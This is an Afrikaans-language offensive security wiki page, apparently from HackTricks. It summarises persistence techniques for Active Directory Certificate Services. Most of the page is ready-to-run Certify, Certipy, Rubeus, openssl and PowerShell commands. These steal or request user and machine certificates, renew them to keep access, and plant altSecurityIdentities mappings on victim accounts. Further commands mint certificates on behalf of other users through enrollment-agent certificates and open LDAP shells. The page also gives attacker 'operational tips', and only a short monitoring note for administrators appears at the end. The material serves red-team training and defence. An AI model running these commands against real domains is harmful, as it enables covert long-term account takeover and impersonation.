# AD CS-rekening-persistensie

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n kort opsomming van die rekening-persistensiehoofstukke van die uitstekende navorsing by [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Verstaan aktiewe gebruiker-geloofsbriewe-diefstal met sertifikate – PERSIST1

In 'n scenario waar 'n sertifikaat wat domeinverifikasie toelaat deur 'n gebruiker aangevra kan word, het 'n aanvaller die geleentheid om hierdie sertifikaat aan te vra en te steel om persistence op 'n netwerk te handhaaf. By verstek laat die `User`-template in Active Directory sulke versoeke toe, alhoewel dit soms gedeaktiveer kan wees.<sup>[[3]](#references)[[7]](#references)</sup>

Deur [Certify](https://github.com/GhostPack/Certify) of [Certipy](https://github.com/ly4k/Certipy) te gebruik, kan jy soek na geaktiveerde templates wat kliëntverifikasie toelaat en dan een aanvra:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
'n Sertifikaat se krag lê in sy vermoë om as die gebruiker aan wie dit behoort, te authenticateer, ongeag wagwoordveranderings, solank die sertifikaat geldig bly.

Jy kan PEM na PFX omskakel en dit gebruik om 'n TGT te verkry:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: Gekombineer met ander tegnieke (sien THEFT-afdelings), laat sertifikaat-gebaseerde verifikasie volgehoue toegang toe sonder om aan LSASS te raak en selfs vanuit nie-verhoogde kontekste.

## Verkryging van Masjien-volharding met Sertifikate - PERSIST2

As ’n aanvaller verhoogde voorregte op ’n gasheer het, kan hulle die gekompromitteerde stelsel se masjienrekening inskryf vir ’n sertifikaat deur die verstek-`Machine`-sjabloon te gebruik. Verifikasie as die masjien aktiveer S4U2Self vir plaaslike dienste en kan volhoubare gasheer-volharding bied:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Volharding uitbrei deur sertifikaatvernuwing - PERSIST3

Deur die geldigheids- en hernuwingstydperke van sertifikaatsjablone te misbruik, kan ’n aanvaller langtermyn-toegang behou. As jy ’n voorheen uitgereikte sertifikaat en die private sleutel daarvan besit, kan jy dit voor vervaldatum hernu om ’n nuwe, langlewende credential te verkry sonder om bykomende versoekartefakte te laat wat aan die oorspronklike principal gekoppel is.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operasionele wenk: Hou rekord van die lewensduur van PFX-lêers wat deur die aanvaller beheer word en hernu dit vroegtydig. Hernuwing kan ook veroorsaak dat opgedateerde sertifikate die moderne SID-karteringsuitbreiding insluit, sodat hulle bruikbaar bly onder strenger DC-karteringsreëls (sien volgende afdeling).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

As jy na ’n teikenrekening se `altSecurityIdentities`-kenmerk kan skryf, kan jy ’n sertifikaat wat deur die aanvaller beheer word, eksplisiet aan daardie rekening karteer. Dit bly behoue ondanks wagwoordveranderings en bly, wanneer sterk karteringsformate gebruik word, funksioneel onder moderne DC-afdwinging.<sup>[[2]](#references)</sup>

Hoëvlakvloei:

1. Verkry of reik ’n kliëntverifikasiesertifikaat uit wat jy beheer (byvoorbeeld, skryf in vir die `User`-template as jouself).
2. Onttrek ’n sterk identifiseerder uit die sertifikaat (Issuer+Serial, SKI, of SHA1-PublicKey).
3. Voeg ’n eksplisiete kartering op die slagoffer-prinsipaal se `altSecurityIdentities` by deur daardie identifiseerder te gebruik.
4. Verifieer met jou sertifikaat; die DC karteer dit via die eksplisiete kartering aan die slagoffer.

Voorbeeld (`PowerShell`) wat ’n sterk Issuer+Serial-kartering gebruik:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Staaf dan met jou PFX. Certipy sal direk 'n TGT bekom:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Bou van Sterk `altSecurityIdentities`-Mappings

In die praktyk is **Issuer+Serial**- en **SKI**-mappings die maklikste sterk formate om vanaf ’n sertifikaat wat deur ’n aanvaller gehou word, te bou. Dit is belangrik ná **11 Februarie 2025**, wanneer DCs by verstek **Full Enforcement** gebruik en swak mappings nie meer betroubaar is nie.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notas
- Gebruik slegs sterk karteringtipes: `X509IssuerSerialNumber`, `X509SKI`, of `X509SHA1PublicKey`. Swak formate (Subject/Issuer, slegs Subject, RFC822-e-pos) is afgekeur en kan deur DC-beleid geblokkeer word.
- Die kartering werk op beide **user**- en **computer**-objekte, dus is skryftoegang tot ’n rekenaarrekening se `altSecurityIdentities` genoeg om as daardie masjien te persisteer.
- Die sertifikaatketting moet bou na ’n wortel wat deur die DC vertrou word. Enterprise CA’s in NTAuth word gewoonlik vertrou; sommige omgewings vertrou ook publieke CA’s.
- Schannel-verifikasie bly nuttig vir persistence selfs wanneer PKINIT misluk omdat die DC nie die Smart Card Logon EKU het nie of `KDC_ERR_PADATA_TYPE_NOSUPP` terugstuur.

#### 2025+ `Issuer/SID`-uitdruklike karterings

Op **Windows Server 2022+**-domeinbeheerders met die **9 September 2025**-sekuriteitsopdatering het Microsoft nog ’n sterk uitdruklike karteringsformaat bygevoeg wat aantreklik is vir persistence omdat dit sertifikaatheruitreiking vanaf dieselfde CA oorleef:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operasioneel verskil dit van die ouer strong formats:
- `Issuer+Serial` pin **een presiese sertifikaat**.
- `SKI` / `SHA1-PUKEY` pin **een keypair**.
- `Issuer/SID` pin **die uitreikende CA + teiken-SID**, sodat hernude of heruitgereikte sertifikate van dieselfde CA bly werk sonder om `altSecurityIdentities` te herskryf.

Vereistes en voorbehoude
- Die sertifikaat wat vir aanmelding aangebied word, moet werklik die teikenrekening se SID in die SID security extension bevat.
- Hierdie formaat is nie nuttig vir `ESC9` / `ESC16`-styl sertifikate wat die SID extension weglaat nie; gebruik in daardie gevalle eerder `Issuer+Serial`, `SKI` of `SHA1-PUKEY`.

Vir meer oor swak eksplisiete mappings en attack paths, sien:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

As jy ’n geldige Certificate Request Agent/Enrollment Agent-sertifikaat bekom, kan jy na willekeur nuwe logon-capable sertifikate namens gebruikers mint en die agent PFX offline as ’n persistence-token behou. Abuse workflow:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Herroeping van die agent-sertifikaat of sjabloontoestemmings is nodig om hierdie persistence te verwyder.

Operasionele notas
- Moderne `Certipy`-weergawes ondersteun beide `-on-behalf-of` en `-renew`, sodat 'n aanvaller met 'n Enrollment Agent PFX eindsertifikate kan skep en dit later kan hernu sonder om weer toegang tot die oorspronklike teikenrekening te verkry.<sup>[[4]](#references)</sup>
- As PKINIT-gebaseerde TGT-verkryging nie moontlik is nie, kan die resulterende on-behalf-of-sertifikaat steeds vir Schannel-verifikasie gebruik word met `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.<sup>[[5]](#references)</sup>

## Gebruik van Persisted Certificates Wanneer PKINIT Misluk

As die DC nie 'n Smart Card Logon-geskikte sertifikaat het nie, kan sertifikaataanmelding via PKINIT misluk met `KDC_ERR_PADATA_TYPE_NOSUPP`. Dit **kanselleer nie** die persistence primitive nie: dieselfde PFX kan dikwels steeds vir Schannel-geverifieerde LDAP-toegang gebruik word.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Dit is veral nuttig ná PERSIST4/PERSIST5, omdat jy vanaf Linux/macOS kan voortgaan en ander directory persistence actions kan ketting, soos om [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) te plaas of skryfbare delegasie-attribuut te wysig.

## 2025 Strong Certificate Mapping Enforcement: Impak op Persistence

Microsoft KB5014754 het Strong Certificate Mapping Enforcement op domeinbeheerders ingestel. Sedert **11 Februarie 2025** gebruik DC's by verstek **Full Enforcement** vir swak/dubbelsinnige mappings, en vanaf die **9 September 2025**-sekuriteitsopdatering ondersteun gelapte DC's nie meer die ou Compatibility-mode-fallback nie.<sup>[[1]](#references)</sup> Praktiese implikasies:

- Sertifikate van vóór 2022 wat nie die SID-mapping-uitbreiding bevat nie, kan implisiete mapping faal wanneer DC's in Full Enforcement is. Attackers kan toegang behou deur óf sertifikate deur AD CS te hernu (om die SID-uitbreiding te verkry), óf deur 'n sterk eksplisiete mapping in `altSecurityIdentities` te plant (PERSIST4).
- Eksplisiete mappings wat sterk formate gebruik (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, en op moderne DC's `Issuer/SID`) bly werk. Swak formate (Issuer/Subject, Subject-only, RFC822) kan geblokkeer word en behoort vir persistence vermy te word.
- As swak mappings steeds blyk te werk, neem aan dat jy 'n ongepatchte of anders gekonfigureerde DC teëgekom het, eerder as 'n betroubare langtermyn-persistence-pad.
- `ESC9` / `ESC16`-agtige issuance-paaie wat die SID-uitbreiding onderdruk, maak `Issuer/SID` onbruikbaar, dus word fallback-sterk mappings of hernuwing deur 'n normale template die praktiese persistence-opsie.

Administrateurs behoort die volgende te monitor en waarskuwings daarvoor op te stel:
- Veranderinge aan `altSecurityIdentities` en issuance/hernuwing van Enrollment Agent- en User-sertifikate.
- CA-uitreikingslogboeke vir on-behalf-of-versoeke en ongewone hernuwingspatrone.

## Verwysings

- [1] [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
